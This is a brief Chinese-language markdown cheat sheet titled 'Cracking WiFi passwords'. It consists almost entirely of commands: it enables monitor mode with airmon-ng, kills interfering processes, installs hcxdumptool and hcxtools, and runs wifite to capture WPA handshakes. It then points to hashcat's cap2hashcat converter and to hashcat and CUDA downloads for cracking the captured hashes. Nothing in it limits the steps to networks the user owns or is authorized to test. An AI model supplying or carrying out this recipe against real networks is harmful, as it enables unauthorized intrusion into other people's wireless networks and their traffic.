# 破解WIFI密码

### VMWARE-虚拟机-连接网卡
### sudo su
### airmon-ng #查看网卡
### sudo airmon-ng check kill #关闭干扰进程
### sudo apt install hcxdumptool hcxtools -y #安装必要组件
### sudo airmon-ng start wlan0 #开启监听
### sudo wifite --no-wps --no-pmkid --wpa 
### sudo wifite --no-wps --no-pmkid --wpa -5 #直接进行抓包
### https://hashcat.net/cap2hashcat/ #转换PCAPNG，PCAP或CAP文件
### https://hashcat.net/hashcat/ 下载hashcat binaries。https://developer.nvidia.com/cuda-downloads 下载CUDA
